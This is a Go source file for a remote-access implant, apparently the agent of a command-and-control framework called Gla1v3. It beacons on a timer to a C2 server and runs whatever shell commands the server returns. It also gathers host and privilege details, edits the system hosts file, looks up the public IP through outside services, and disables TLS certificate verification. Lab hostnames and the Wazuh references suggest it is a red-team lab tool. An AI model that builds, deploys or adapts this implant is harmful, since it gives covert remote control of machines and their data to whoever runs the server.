package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"
	"time"
)

// Build-time configuration (injected via -ldflags)
var (
	BeaconInterval = "30s"                  // Default beacon interval
	C2Server       = "c2.gla1v3.local:4443" // Default C2 server
	EmbeddedTasks  = "[]"                   // JSON array of tasks to execute
	EmbeddedCACert = ""                     // PEM encoded CA certificate
	EmbeddedCert   = ""                     // PEM encoded client certificate
	EmbeddedKey    = ""                     // PEM encoded client key
)

// Task represents a task to execute on the agent
type Task struct {
	ID      string            `json:"id"`
	Type    string            `json:"type"`
	Params  map[string]string `json:"params"`
	RunOnce bool              `json:"runOnce"`
}

// TaskResult represents the result of task execution
type TaskResult struct {
	TaskID string `json:"taskId"`
	Type   string `json:"type"`
	Status string `json:"status"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// executeTask runs a task and sends the result back to C2
func executeTask(client *http.Client, dialCtx func(context.Context, string, string) (net.Conn, error), c2URL, agentID, taskID, cmd string, args []string) {
	log.Printf("Executing task %s: %s %v", taskID, cmd, args)
	
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	var result string
	var taskErr string
	status := "completed"
	
	// Execute the command
	execCmd := exec.CommandContext(ctx, cmd, args...)
	output, err := execCmd.CombinedOutput()
	
	if err != nil {
		taskErr = err.Error()
		status = "failed"
		log.Printf("Task %s failed: %v", taskID, err)
	} else {
		result = string(output)
		if len(result) > 4096 {
			result = result[:4096] + "...(truncated)"
		}
		log.Printf("Task %s completed successfully", taskID)
	}
	
	// Send result back to C2
	resultPayload := map[string]interface{}{
		"result": result,
		"error":  taskErr,
		"status": status,
	}
	
	resultBody, _ := json.Marshal(resultPayload)
	
	// Build result URL - replace /beacon with task result endpoint
	resultURL := strings.Replace(c2URL, "/beacon", fmt.Sprintf("/api/agents/%s/tasks/%s/result", agentID, taskID), 1)
	// Convert c2.gla1v3.local to api.gla1v3.local
	resultURL = strings.Replace(resultURL, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
	
	resultReq, _ := http.NewRequest("POST", resultURL, bytes.NewReader(resultBody))
	resultReq.Header.Set("Content-Type", "application/json")
	
	// Use a plain HTTPS client for API endpoint with DNS bypass
	apiClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				RootCAs:            client.Transport.(*http.Transport).TLSClientConfig.RootCAs,
				ServerName:         "api.gla1v3.local",
				MinVersion:         tls.VersionTLS12,
				InsecureSkipVerify: true,
			},
			DialContext: dialCtx, // Use DNS bypass
		},
		Timeout: 10 * time.Second,
	}
	
	resultResp, err := apiClient.Do(resultReq)
	if err != nil {
		log.Printf("Failed to send task result: %v", err)
		return
	}
	defer resultResp.Body.Close()
	
	log.Printf("Task result sent: %s", resultResp.Status)
}

// executeEmbeddedTask executes a predefined embedded task
func executeEmbeddedTask(task Task) TaskResult {
	result := TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
		Status: "completed",
	}

	log.Printf("Executing embedded task: %s (type: %s)", task.ID, task.Type)

	switch task.Type {
	case "sys_info":
		result.Output = collectSystemInfo()
	case "cmd":
		output, err := executeCommand(task.Params["command"])
		result.Output = output
		if err != nil {
			result.Status = "failed"
			result.Error = err.Error()
		}
	case "network_scan":
		result.Output = fmt.Sprintf("Network scan not yet implemented (subnet: %s)", task.Params["subnet"])
	case "file_search":
		result.Output = fmt.Sprintf("File search not yet implemented (path: %s, pattern: %s)", 
			task.Params["path"], task.Params["pattern"])
	case "priv_check":
		result.Output = collectPrivilegeInfo()
	default:
		result.Status = "failed"
		result.Error = fmt.Sprintf("Unknown task type: %s", task.Type)
	}

	return result
}

// collectSystemInfo gathers basic system information
func collectSystemInfo() string {
	info := make(map[string]string)
	
	// Hostname
	if hostname, err := os.Hostname(); err == nil {
		info["hostname"] = hostname
	}
	
	// OS and architecture
	info["os"] = runtime.GOOS
	info["arch"] = runtime.GOARCH
	
	// User
	if user := os.Getenv("USER"); user != "" {
		info["user"] = user
	} else if user := os.Getenv("USERNAME"); user != "" {
		info["user"] = user
	}
	
	// Kernel version (Linux)
	if runtime.GOOS == "linux" {
		if output, err := exec.Command("uname", "-r").Output(); err == nil {
			info["kernel"] = strings.TrimSpace(string(output))
		}
	}
	
	// OS version
	if runtime.GOOS == "linux" {
		if data, err := os.ReadFile("/etc/os-release"); err == nil {
			for _, line := range strings.Split(string(data), "\n") {
				if strings.HasPrefix(line, "PRETTY_NAME=") {
					info["os_version"] = strings.Trim(strings.TrimPrefix(line, "PRETTY_NAME="), "\"")
					break
				}
			}
		}
	} else if runtime.GOOS == "windows" {
		if output, err := exec.Command("cmd", "/c", "ver").Output(); err == nil {
			info["os_version"] = strings.TrimSpace(string(output))
		}
	}
	
	output, _ := json.MarshalIndent(info, "", "  ")
	return string(output)
}

// executeCommand runs a shell command
func executeCommand(command string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", command)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}
	
	output, err := cmd.CombinedOutput()
	result := string(output)
	
	if len(result) > 4096 {
		result = result[:4096] + "...(truncated)"
	}
	
	return result, err
}

// collectPrivilegeInfo checks for privilege escalation vectors
func collectPrivilegeInfo() string {
	info := make(map[string]interface{})
	
	// Check if running as root/admin
	if runtime.GOOS == "linux" {
		output, _ := exec.Command("id", "-u").Output()
		uid := strings.TrimSpace(string(output))
		info["is_root"] = (uid == "0")
		info["uid"] = uid
		
		// Check sudo access
		if err := exec.Command("sudo", "-n", "true").Run(); err == nil {
			info["has_sudo"] = true
		} else {
			info["has_sudo"] = false
		}
	} else if runtime.GOOS == "windows" {
		// Windows admin check
		cmd := exec.Command("net", "session")
		if err := cmd.Run(); err == nil {
			info["is_admin"] = true
		} else {
			info["is_admin"] = false
		}
	}
	
	output, _ := json.MarshalIndent(info, "", "  ")
	return string(output)
}

// sendTaskResults sends embedded task results to C2
func sendTaskResults(client *http.Client, c2Server, agentID string, results []TaskResult) {
	if len(results) == 0 {
		return
	}
	
	// Build API URL
	apiURL := strings.Replace("https://"+c2Server, "c2.gla1v3.local:4443", "api.gla1v3.local", 1)
	apiURL = strings.Replace(apiURL, "/beacon", "", 1)
	resultURL := fmt.Sprintf("%s/api/agents/%s/embedded-tasks", apiURL, agentID)
	
	payload := map[string]interface{}{
		"results": results,
	}
	
	body, _ := json.Marshal(payload)
	
	log.Printf("Sending %d embedded task results to %s", len(results), resultURL)
	
	req, _ := http.NewRequest("POST", resultURL, bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Failed to send embedded task results: %v", err)
		return
	}
	defer resp.Body.Close()
	
	if resp.StatusCode == 200 {
		log.Printf("Successfully sent embedded task results")
	} else {
		log.Printf("Failed to send embedded task results: %s", resp.Status)
	}
}

// detectGateway detects the C2 host IP address
func detectGateway() (string, error) {
	// Try to find Host-Only network first (common in VirtualBox/VMware)
	// These typically use 192.168.56.x or 192.168.57.x ranges
	if runtime.GOOS == "linux" {
		cmd := exec.Command("sh", "-c", "ip addr show | grep 'inet ' | awk '{print $2}' | cut -d/ -f1")
		output, err := cmd.Output()
		if err == nil {
			ips := strings.Split(strings.TrimSpace(string(output)), "\n")
			for _, ip := range ips {
				ip = strings.TrimSpace(ip)
				// Skip loopback and common NAT ranges
				if ip == "127.0.0.1" || strings.HasPrefix(ip, "10.0.2.") {
					continue
				}
				// Prefer 192.168.x.x ranges (common for Host-Only)
				if strings.HasPrefix(ip, "192.168.") {
					parts := strings.Split(ip, ".")
					if len(parts) == 4 {
						hostIP := parts[0] + "." + parts[1] + "." + parts[2] + ".1"
						log.Printf("Found Host-Only network interface with IP %s, testing host at %s...", ip, hostIP)
						if testHostReachable(hostIP) {
							return hostIP, nil
						}
					}
				}
			}
		}
	}
	
	// Fallback to default gateway detection
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", "route print 0.0.0.0")
	} else {
		cmd = exec.Command("sh", "-c", "ip route | grep default | awk '{print $3}' | head -n1")
	}
	
	output, err := cmd.Output()
	if err != nil {
		return "", err
	}
	
	gateway := strings.TrimSpace(string(output))
	
	// For Windows, parse the route print output
	if runtime.GOOS == "windows" {
		lines := strings.Split(gateway, "\n")
		for _, line := range lines {
			if strings.Contains(line, "0.0.0.0") && strings.Contains(line, "0.0.0.0") {
				fields := strings.Fields(line)
				if len(fields) >= 3 {
					gateway = fields[2]
					break
				}
			}
		}
	}
	
	// For VM environments, try .1 first (common host machine IP)
	if strings.Contains(gateway, ".") {
		parts := strings.Split(gateway, ".")
		if len(parts) == 4 {
			hostIP := parts[0] + "." + parts[1] + "." + parts[2] + ".1"
			log.Printf("Testing host IP %s...", hostIP)
			if testHostReachable(hostIP) {
				log.Printf("Host IP %s is reachable, using it", hostIP)
				return hostIP, nil
			}
			log.Printf("Host IP %s not reachable, using gateway %s", hostIP, gateway)
		}
	}
	
	return gateway, nil
}

// testHostReachable tests if a host IP is reachable on port 443
func testHostReachable(hostIP string) bool {
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	
	client := &http.Client{
		Timeout: 2 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	
	req, _ := http.NewRequestWithContext(ctx, "GET", "https://"+hostIP+":443", nil)
	_, testErr := client.Do(req)
	
	return testErr == nil || strings.Contains(testErr.Error(), "certificate") || strings.Contains(testErr.Error(), "handshake")
}

// setupHosts adds entries to the hosts file for C2 domains
func setupHosts(gateway string) error {
	var hostsPath string
	if runtime.GOOS == "windows" {
		hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts"
	} else {
		hostsPath = "/etc/hosts"
	}
	
	// Read current hosts file
	content, err := ioutil.ReadFile(hostsPath)
	if err != nil {
		return fmt.Errorf("failed to read hosts file: %v", err)
	}
	
	// Remove any existing Gla1v3 entries (including old/stale ones)
	lines := strings.Split(string(content), "\n")
	var cleanedLines []string
	skipNext := false
	
	for _, line := range lines {
		if strings.Contains(line, "# Gla1v3 C2") {
			skipNext = true
			continue
		}
		if skipNext && (strings.Contains(line, "gla1v3.local")) {
			continue
		}
		// Also remove any standalone gla1v3.local entries without comment
		if strings.Contains(line, "gla1v3.local") {
			continue
		}
		skipNext = false
		cleanedLines = append(cleanedLines, line)
	}
	
	// Add fresh entries with current gateway
	entries := fmt.Sprintf("\n# Gla1v3 C2 (auto-added)\n%s api.gla1v3.local\n%s c2.gla1v3.local\n%s dashboard.gla1v3.local\n%s wazuh.gla1v3.local\n", gateway, gateway, gateway, gateway)
	newContent := strings.Join(cleanedLines, "\n") + entries
	
	// Write back
	err = ioutil.WriteFile(hostsPath, []byte(newContent), 0644)
	if err != nil {
		return fmt.Errorf("failed to write hosts file: %v", err)
	}
	
	log.Printf("Updated hosts entries: %s -> *.gla1v3.local", gateway)
	return nil
}

// cleanupHosts removes C2 entries from the hosts file
func cleanupHosts() {
	var hostsPath string
	if runtime.GOOS == "windows" {
		hostsPath = "C:\\Windows\\System32\\drivers\\etc\\hosts"
	} else {
		hostsPath = "/etc/hosts"
	}
	
	// Read current hosts file
	content, err := ioutil.ReadFile(hostsPath)
	if err != nil {
		log.Printf("Failed to read hosts file during cleanup: %v", err)
		return
	}
	
	// Remove Gla1v3 entries
	lines := strings.Split(string(content), "\n")
	var newLines []string
	skipNext := false
	
	for _, line := range lines {
		if strings.Contains(line, "# Gla1v3 C2 (auto-added)") {
			skipNext = true
			continue
		}
		if skipNext && (strings.Contains(line, "api.gla1v3.local") || strings.Contains(line, "c2.gla1v3.local")) {
			continue
		}
		skipNext = false
		newLines = append(newLines, line)
	}
	
	// Write back
	newContent := strings.Join(newLines, "\n")
	err = ioutil.WriteFile(hostsPath, []byte(newContent), 0644)
	if err != nil {
		log.Printf("Failed to write hosts file during cleanup: %v", err)
		return
	}
	
	log.Println("Cleaned up hosts entries")
}

// Global variable to store detected host IP
var detectedHostIP string

func main() {
	var cert tls.Certificate
	var caCertPool *x509.CertPool
	var loadErr error

	// Setup signal handling for cleanup
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		log.Println("Received shutdown signal, cleaning up...")
		cleanupHosts()
		os.Exit(0)
	}()

	// Detect gateway - store it globally for URL construction
	gateway, err := detectGateway()
	if err != nil {
		log.Printf("Warning: Failed to detect gateway: %v", err)
		log.Println("Proceeding without automatic hosts configuration")
	} else {
		log.Printf("Detected gateway: %s", gateway)
		detectedHostIP = gateway
		
		// Try to setup hosts file (will fail without root, but that's okay)
		if err := setupHosts(gateway); err != nil {
			log.Printf("Info: Could not update /etc/hosts (will use IP directly): %v", err)
		}
	}

	// Check if we have embedded certificates (compiled-in)
	if EmbeddedCert != "" && EmbeddedKey != "" && EmbeddedCACert != "" {
		log.Println("Using embedded certificates")
		
		// Convert escaped newlines back to actual newlines
		certPEM := strings.Replace(EmbeddedCert, "\\n", "\n", -1)
		keyPEM := strings.Replace(EmbeddedKey, "\\n", "\n", -1)
		caCertPEM := strings.Replace(EmbeddedCACert, "\\n", "\n", -1)
		
		// Load embedded cert/key pair
		cert, loadErr = tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
		if loadErr != nil {
			log.Fatalf("Failed to load embedded cert/key: %v", loadErr)
		}
		
		// Load embedded CA cert
		caCertPool = x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM([]byte(caCertPEM)) {
			log.Fatal("Failed to append embedded CA cert to pool")
		}
		
		log.Println("Successfully loaded embedded certificates")
	} else {
		// Fallback to file-based certificates
		log.Println("No embedded certs found, loading from files...")
		
		// Resolve cert/key pair. Prefer env vars; otherwise try common repo filenames
		certEnv := os.Getenv("AGENT_CERT_PATH")
		keyEnv := os.Getenv("AGENT_KEY_PATH")

		tryPairs := [][]string{}
		if certEnv != "" && keyEnv != "" {
			tryPairs = append(tryPairs, []string{certEnv, keyEnv})
		}
		// repo-local candidates (relative to agents-go)
		tryPairs = append(tryPairs, [][]string{
			{"../certs/agent-client.crt", "../certs/agent-client.key"},
			{"../certs/agent.crt", "../certs/agent.key"},
			{"../certs/server.crt", "../certs/server.key"},
		}...)

		var loadedCertPath, loadedKeyPath string
		attempted := []string{}
		for _, p := range tryPairs {
			attempted = append(attempted, p[0]+"|"+p[1])
			if _, err := os.Stat(p[0]); err != nil {
				continue
			}
			if _, err := os.Stat(p[1]); err != nil {
				continue
			}
			cert, loadErr = tls.LoadX509KeyPair(p[0], p[1])
			if loadErr == nil {
				loadedCertPath = p[0]
				loadedKeyPath = p[1]
				break
			}
		}
		if loadErr != nil {
			log.Fatalf("Failed to load any agent cert/key pair. Attempts: %v. Last error: %v", attempted, loadErr)
		}
		log.Printf("Loaded agent cert/key: %s , %s", loadedCertPath, loadedKeyPath)

		// Load CA cert from file
		caPath := os.Getenv("AGENT_CA_PATH")
		if caPath == "" {
			caPath = "../certs/ca.crt"
		}

		caCert, err := os.ReadFile(caPath)
		if err != nil {
			log.Fatal("Failed to read CA cert:", err)
		}
		caCertPool = x509.NewCertPool()
		if !caCertPool.AppendCertsFromPEM(caCert) {
			log.Fatal("Failed to append CA cert to pool")
		}
	}

	// Server names
	serverName := os.Getenv("AGENT_SERVER_NAME")
	if serverName == "" {
		serverName = "c2.gla1v3.local"
	}
	apiServerName := os.Getenv("AGENT_API_SERVER_NAME")
	if apiServerName == "" {
		apiServerName = "api.gla1v3.local"
	}

	// Custom dialer to bypass DNS when we have a detected host IP
	dialer := &net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}
	
	dialContext := func(ctx context.Context, network, addr string) (net.Conn, error) {
		// If we detected a host IP and the address contains gla1v3.local, use the IP
		if detectedHostIP != "" && strings.Contains(addr, "gla1v3.local") {
			// Extract port from addr (e.g., "c2.gla1v3.local:4443" -> ":4443")
			parts := strings.Split(addr, ":")
			if len(parts) >= 2 {
				port := parts[len(parts)-1]
				addr = detectedHostIP + ":" + port
				log.Printf("Bypassing DNS: using %s", addr)
			}
		}
		return dialer.DialContext(ctx, network, addr)
	}

	// 3. mTLS config (required by default)
	// Note: InsecureSkipVerify for Traefik's certificate, but still presents client cert
	tlsConfig := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		ServerName:         serverName,
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // Skip Traefik cert verification, mTLS still works
	}

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: tlsConfig,
			DialContext:     dialContext,
		},
		Timeout: 10 * time.Second,
	}

	// Separate TLS config for API (whoami) requests: trust same CA but use API servername
	// API TLS: also present client cert for mTLS to API
	apiTLS := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		ServerName:         apiServerName,
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // Skip Traefik cert verification, mTLS still works
	}

	whoamiClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: apiTLS,
			DialContext:     dialContext,
		},
		Timeout: 6 * time.Second,
	}

	whoamiToken := os.Getenv("AGENT_WHOAMI_TOKEN")

	// 4. Beacon loop with whoami execution and JSON POST
	agentID := os.Getenv("AGENT_NAME")
	if agentID == "" {
		agentID = "agent-" + fmt.Sprintf("%d", time.Now().UnixNano())
	}

	// Use build-time configuration (can be overridden by env vars)
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://" + C2Server + "/beacon"
	}
	
	beaconInterval, err := time.ParseDuration(BeaconInterval)
	if err != nil {
		log.Printf("Invalid BeaconInterval '%s', using default 30s", BeaconInterval)
		beaconInterval = 30 * time.Second
	}
	
	// Env var can override build-time config
	if v := os.Getenv("BEACON_INTERVAL"); v != "" {
		if iv, err := time.ParseDuration(v); err == nil {
			beaconInterval = iv
		}
	}

	// Limits
	const cmdTimeout = 3 * time.Second
	const maxOutput = 2048

	// Parse and execute embedded tasks
	var embeddedTasks []Task
	var taskResults []TaskResult
	executedTasks := make(map[string]bool)
	
	if EmbeddedTasks != "" && EmbeddedTasks != "[]" {
		if err := json.Unmarshal([]byte(EmbeddedTasks), &embeddedTasks); err != nil {
			log.Printf("Failed to parse embedded tasks: %v", err)
		} else {
			log.Printf("Loaded %d embedded tasks", len(embeddedTasks))
			
			// Execute run-once tasks immediately
			for _, task := range embeddedTasks {
				if task.RunOnce {
					result := executeEmbeddedTask(task)
					taskResults = append(taskResults, result)
					executedTasks[task.ID] = true
				}
			}
			
			// Send initial task results
			if len(taskResults) > 0 {
				// Use API client with proper TLS config and DNS bypass
				apiClient := &http.Client{
					Transport: &http.Transport{
						TLSClientConfig: &tls.Config{
							Certificates:       []tls.Certificate{cert},
							RootCAs:            caCertPool,
							ServerName:         "api.gla1v3.local",
							MinVersion:         tls.VersionTLS12,
							InsecureSkipVerify: true,
						},
						DialContext: dialContext, // Use DNS bypass
					},
					Timeout: 10 * time.Second,
				}
				sendTaskResults(apiClient, C2Server, agentID, taskResults)
			}
		}
	}

	// Helper to get local IP address
	getLocalIP := func() string {
		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		defer cancel()
		
		var cmd *exec.Cmd
		// Try OS-specific commands
		if _, err := exec.LookPath("ipconfig"); err == nil {
			// Windows
			cmd = exec.CommandContext(ctx, "ipconfig")
		} else if _, err := exec.LookPath("ip"); err == nil {
			// Linux
			cmd = exec.CommandContext(ctx, "ip", "addr", "show")
		} else {
			return ""
		}
		
		out, err := cmd.Output()
		if err != nil {
			return ""
		}
		
		// Parse output for IPv4 addresses (skip localhost)
		lines := strings.Split(string(out), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			// Windows: "IPv4 Address. . . . . . . . . . . : 192.168.1.100"
			if strings.Contains(line, "IPv4 Address") {
				parts := strings.Split(line, ":")
				if len(parts) >= 2 {
					ip := strings.TrimSpace(parts[1])
					if !strings.HasPrefix(ip, "127.") {
						return ip
					}
				}
			}
			// Linux: "inet 192.168.1.100/24"
			if strings.HasPrefix(line, "inet ") && !strings.Contains(line, "127.0.0.1") {
				parts := strings.Fields(line)
				if len(parts) >= 2 {
					ip := strings.Split(parts[1], "/")[0]
					if !strings.HasPrefix(ip, "127.") {
						return ip
					}
				}
			}
		}
		return ""
	}

	seq := 0
	for {
		seq++

		// Run whoami with timeout
		ctx, cancel := context.WithTimeout(context.Background(), cmdTimeout)
		cmd := exec.CommandContext(ctx, "whoami")
		outBytes, err := cmd.Output()
		cancel()

		output := ""
		errStr := ""
		if err != nil {
			// include stderr if possible
			if ee, ok := err.(*exec.ExitError); ok {
				errStr = strings.TrimSpace(string(ee.Stderr))
			} else {
				errStr = err.Error()
			}
			log.Printf("whoami failed: %v", err)
		}
		if len(outBytes) > 0 {
			output = strings.TrimSpace(string(outBytes))
			if len(output) > maxOutput {
				output = output[:maxOutput] + "...(truncated)"
			}
		}

		// Get local IP address
		localIP := getLocalIP()

		// Build structured payload
		payload := map[string]interface{}{
			"agent_id": agentID,
			"seq":      seq,
			"output":   output,
			"error":    errStr,
			"ts":       time.Now().UTC().Format(time.RFC3339),
		}
		
		if localIP != "" {
			payload["localIp"] = localIP
		}

		// Attempt to learn public IP via secure whoami endpoint on the API
		publicIP := ""
		if whoamiToken != "" {
			func() {
				req, _ := http.NewRequest("GET", "https://api.gla1v3.local/whoami", nil)
				req.Header.Set("Authorization", "Bearer "+whoamiToken)
				req.Header.Set("User-Agent", "Gla1v3-Agent/0.1 whoami")
				resp, err := whoamiClient.Do(req)
				if err != nil {
					log.Printf("whoami request failed: %v", err)
					return
				}
				defer resp.Body.Close()
				if resp.StatusCode != 200 {
					log.Printf("whoami non-200: %s", resp.Status)
					return
				}
				var j struct {
					IP string `json:"ip"`
				}
				if err := json.NewDecoder(resp.Body).Decode(&j); err != nil {
					log.Printf("whoami decode failed: %v", err)
					return
				}
				if j.IP != "" {
					publicIP = j.IP
					log.Printf("whoami -> publicIp: %s", j.IP)
				}
			}()
		}
		
		// Fallback: try external IP services if whoami didn't work
		if publicIP == "" {
			for _, ipService := range []string{
				"https://api.ipify.org?format=text",
				"https://icanhazip.com",
				"https://ifconfig.me/ip",
			} {
				func() {
					ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
					defer cancel()
					req, _ := http.NewRequestWithContext(ctx, "GET", ipService, nil)
					req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
					
					// Use default HTTP client without mTLS for public services
					plainClient := &http.Client{Timeout: 5 * time.Second}
					resp, err := plainClient.Do(req)
					if err != nil {
						return
					}
					defer resp.Body.Close()
					if resp.StatusCode != 200 {
						return
					}
					var buf bytes.Buffer
					if _, err := buf.ReadFrom(resp.Body); err != nil {
						return
					}
					ip := strings.TrimSpace(buf.String())
					if ip != "" && len(ip) < 50 { // sanity check
						publicIP = ip
						log.Printf("External IP service -> publicIp: %s", ip)
					}
				}()
				if publicIP != "" {
					break
				}
			}
		}
		
		if publicIP != "" {
			payload["publicIp"] = publicIP
		}

		bodyBytes, jerr := json.Marshal(payload)
		if jerr != nil {
			log.Printf("Failed to marshal beacon payload: %v", jerr)
			time.Sleep(beaconInterval)
			continue
		}

		req, rerr := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
		if rerr != nil {
			log.Printf("Failed to create request: %v", rerr)
			time.Sleep(beaconInterval)
			continue
		}
		req.Header.Set("User-Agent", "Gla1v3-Agent/0.1")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-Agent-ID", agentID)

		resp, derr := client.Do(req)
		if derr != nil {
			log.Printf("Beacon POST failed: %v", derr)
		} else {
			log.Printf("Beacon POST -> %s | Agent-ID: %s | seq=%d", resp.Status, agentID, seq)
			
			// Check for tasks in response
			var taskResp struct {
				Tasks []struct {
					ID   string   `json:"id"`
					Cmd  string   `json:"cmd"`
					Args []string `json:"args"`
				} `json:"tasks"`
			}
			
			if err := json.NewDecoder(resp.Body).Decode(&taskResp); err == nil && len(taskResp.Tasks) > 0 {
				log.Printf("Received %d tasks from C2", len(taskResp.Tasks))
				
				// Execute each task
				for _, task := range taskResp.Tasks {
					go executeTask(client, dialContext, c2URL, agentID, task.ID, task.Cmd, task.Args)
				}
			}
			resp.Body.Close()
		}

		time.Sleep(beaconInterval)
	}
}
